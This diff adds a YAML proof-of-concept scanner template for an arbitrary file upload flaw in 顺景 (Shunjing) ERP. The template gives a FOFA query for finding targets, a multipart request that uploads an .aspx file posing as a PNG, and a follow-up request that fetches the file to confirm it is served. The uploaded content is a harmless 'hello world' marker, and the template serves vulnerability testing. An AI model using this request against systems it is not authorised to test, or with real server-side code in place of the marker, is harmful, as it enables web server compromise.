@@ -1,0 +1,33 @@
+id: poc-yaml-centersoft-fileupload-upload
+info:
+  name: 顺景ERP管理系统FileUpload存在任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 顺景ERP管理系统
+  fofa: body="/api/DBRecord/getDBRecords"
+requests:
+- method: POST
+  path: /api/FileUpload/Upload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
+  data: '------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
+
+    Content-Disposition: form-data; name="file"; filename="1.aspx"
+
+    Content-Type: image/png
+
+
+    hello world
+
+    ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--
+
+    '
+  output:
+  - set_var("filepath",find_json(body,"GUID"))
+  expression: "status_code == 200 && \ncontains(body,\"\\\"GUID\\\"\")\n"
+- method: GET
+  path: /UpFiles/{{.filepath}}.aspx
+  expression: "status_code == 200 && \nbody == \"hello world\"\n"
+variables: {}
+transport: http
